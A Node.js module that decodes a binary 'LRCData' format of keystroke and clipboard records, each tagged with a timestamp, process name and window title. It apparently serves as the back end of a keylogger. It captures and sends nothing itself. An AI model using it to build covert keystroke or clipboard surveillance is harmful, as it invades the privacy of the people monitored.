function readLRCData(buffer) {
    var header = readHeader(buffer);
    if (header == null) {
        // Cannot read header
        // LRCData file is damaged
        return { ok: false, message: 'Unable to read LRCData header' };
    }

    var result = {};
    result.ok = true;
    result.id = header.id;
    result.type = header.type;
    result.data = null;

    try {
        var rawData = new Buffer(header.length);
        buffer.copy(rawData, 0, 0x0048, buffer.length);
        switch (header.type) {
            case 0x0:
                // Error
                result.data = readErrorData(rawData);
                break;
            case 0x1:
                // Keyboard
                result.data = readKeyboardData(rawData);
                break;
            case 0x2:
                // Clipboard
                result.data = readClipboardData(rawData);
                break;
            default:
                // Unknown type
                return { ok: false, message: 'Unknown type \'' + header.type + '\'' };
                break;
        }
    } catch (ex) {
        return { ok: false, message: 'Exception: ' + ex.message };
    }

    if (result.data == null) {
        return { ok: false, message: 'Can\'t parse data' };
    }

    return result;
}

function readHeader(buffer) {
    // Buffer length should be at least 0x0048 (size of header)
    if (buffer.length < 0x0048) {
        return null;
    }

    // Read header values
    var result = {};
    result.signature = buffer.readUInt16BE(0x0000);
    result.version = buffer.readInt8(0x0002);
    result.id = buffer.toString('ascii', 0x0003, 0x0043);
    result.type = buffer.readInt8(0x0043);
    result.length = buffer.readUInt32BE(0x0044);

    // If length of data block is wrong
    if (buffer.length - 0x0048 != result.length) {
        return null;
    }

    return result;
}

function readErrorData(buffer) {
    var code = buffer.readUInt32BE(0);
    var message = readString(buffer, 4);
    return { code: code, message: message };
}

function readKeyboardData(buffer) {
    var offset = 0x0;
    var count = buffer.readUInt32BE(offset);
    offset += 4;

    var items = [];
    for (var i = 0; i < count; i++) {
        var kbd = readKeyboard(buffer, offset);
        offset = kbd.offset;
        items.push(kbd.data);
    }

    return { count: count, items: items };
}

function readClipboardData(buffer) {
    var offset = 0x0;
    var count = buffer.readUInt32BE(offset);
    offset += 4;

    var items = [];
    for (var i = 0; i < count; i++) {
        var wndInfo = readWNDInfo(buffer, offset);
        offset = wndInfo.offset;
        var data = readString(buffer, offset);
        offset = data.offset;
        items.push({ wndInfo: wndInfo.data, data: data.data });
    }

    return { count: count, items: items };
}

function readKeyboard(buffer, offset) {
    var wndInfo = readWNDInfo(buffer, offset);
    var count = buffer.readUInt32BE(wndInfo.offset);
    offset = wndInfo.offset + 4;

    var keyboard = {};
    keyboard.data = {};
    keyboard.data.wndInfo = wndInfo.data;
    keyboard.data.count = count;
    keyboard.data.keys = [];

    for (var i = 0; i < count; i++) {
        var vkInfo = readVKInfo(buffer, offset);
        offset = vkInfo.offset;
        keyboard.data.keys.push(vkInfo.data);
    }

    keyboard.offset = offset;
    return keyboard;
}

function readVKInfo(buffer, offset) {
    var vkInfo = {};
    vkInfo.data = {};
    vkInfo.data.keyCode = buffer.readUInt32BE(offset);
    vkInfo.data.lang = buffer.readUInt16BE(offset + 4);
    vkInfo.data.flags = buffer.readInt8(offset + 6);
    vkInfo.offset = offset + 7;
    return vkInfo;
}

function readWNDInfo(buffer, offset) {
    var time = buffer.readUInt32BE(offset);
    var process = readString(buffer, offset + 4);
    var title = readString(buffer, process.offset);

    var wndInfo = {};
    wndInfo.data = {};
    wndInfo.data.time = time;
    wndInfo.data.process = process.data;
    wndInfo.data.title = title.data;
    wndInfo.offset = title.offset;
    return wndInfo;
}

function readString(buffer, offset) {
    var length = buffer.readUInt32BE(offset);

    result = {};
    result.data = buffer.toString('utf8', offset + 4, offset + 4 + length);
    result.offset = offset + 4 + length;
    return result;
}

module.exports.read = function (buffer) {
    return readLRCData(buffer);
}

